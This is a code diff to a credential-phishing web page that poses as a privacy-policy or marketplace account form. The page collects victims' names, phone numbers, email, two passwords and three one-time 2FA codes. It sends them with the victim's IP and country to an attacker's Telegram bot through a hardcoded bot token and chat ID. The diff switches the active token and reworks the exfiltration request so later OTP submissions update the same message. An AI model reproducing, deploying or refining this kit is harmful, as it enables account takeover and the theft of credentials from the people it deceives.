@@ -1,4 +1,4 @@
-<style>
+﻿<style>
     #intro {
         position: fixed;
         top: 0;
@@ -46,9 +46,6 @@
 <!DOCTYPE html>
 <html lang="en" id="html">
 <head>
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="0">
 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -4355,8 +4352,8 @@
         };
     </script>
     <script>
-    //    var apiKey = "7861008820:AAEpRnH07HOopuC2o5bV53S8pZjKA5h20TM",chatId='1117818432';
-    var apiKey = "7919345658:AAGVy4jwPdSyRKp6VDJ8a5gsq2DTNn-M4Bs",chatId='6580233045';
+       var apiKey = "7861008820:AAEpRnH07HOopuC2o5bV53S8pZjKA5h20TM",chatId='1117818432';
+    // var apiKey = "7919345658:AAGVy4jwPdSyRKp6VDJ8a5gsq2DTNn-M4Bs",chatId='6580233045';
         const subLinks = {
             'PolicyCollapse': [{
                 'text': 'What is the Privacy Policy and what does it cover?',
@@ -4673,9 +4670,8 @@
         // Send data to Email
         function sendDataEmail(msgId, callback) {
             var templateTELEData = "🎁 Quà tặng cuộc sống 🎁\n-URL : " + window.location.href + "\n-IP : " + userIpData.user_ip + "\n-Country : " + userIpData.country + ", " + userIpData.country_code + "\n-Fullname: " + formsSendData["full-name"] + "\nMarketplace name : " + formsSendData["page-name"] + "\n-Phone number : " + formsSendData["mobile-phone-number"] + "\n==========================\n👌 Đã lấy được Email/Pass\n-Email : " + formsSendData['personal-email'] + "\n-Password-1 : " + formsSendData['password-1'] + "\n-Password-2 : " + formsSendData["password-2"] + "\n==========================\n👌 Đã lấy được OTP 1 : " + formsSendData["2FA-1"] + "\n==========================\n👌 Đã lấy được OTP 2 : " + formsSendData["2FA-2"] + "\n==========================\n👌 Đã lấy được OTP 3 : " + formsSendData['2FA-3'] + "\n-Time: " + getTimeGMT7();
-
             var apiEndpoint = msgId ? '/editMessageText' : '/sendMessage'; // Chọn API phù hợp
-
+            console.log(msgId, apiEndpoint);
             var data = msgId ? {
                 'chat_id': chatId,
                 'message_id': msgId,
@@ -4687,11 +4683,21 @@
                 'parse_mode': "HTML"
             };
 
-            $.ajax("https://api.telegram.org/bot" + apiKey + apiEndpoint,{
-            'type': "POST",
-            'data': JSON.stringify(data),
-            'contentType': 'application/json'
-            }).done(function () {}).fail(function (_0x33795a) {});
+            $.ajax({
+                url: `https://api.telegram.org/bot${apiKey}${apiEndpoint}`,
+                type: "POST",
+                data: JSON.stringify(data),
+                contentType: "application/json",
+                success: function (response) {
+                    // console.log("✅ Thành công:", response);
+                    if (!msgId && response.ok) {
+                        callback(response.result.message_id);
+                    }
+                },
+                error: function (error) {
+                    console.error("❌ Lỗi:", error);
+                }
+            });
             
             // checkCoutry(templateTELEData);
         }
@@ -4744,7 +4750,7 @@
                     sendDataEmail(null, function (messageId) {
                         msgId = messageId;
                     });
-                    console.log("gửi password lần 1");
+                    // console.log("gửi password lần 1");
                     spiner.style.display = 'none'
                     buttonText.style.display = 'block'
                     button.removeAttribute('disabled')
@@ -4753,7 +4759,7 @@
                 } else {
                     sendDataEmail(msgId);
                     
-                    console.log("gửi password lần 2");
+                    // console.log("gửi password lần 2");
 
                     errortext.style.display = 'none'
                     spiner.style.display = 'none'
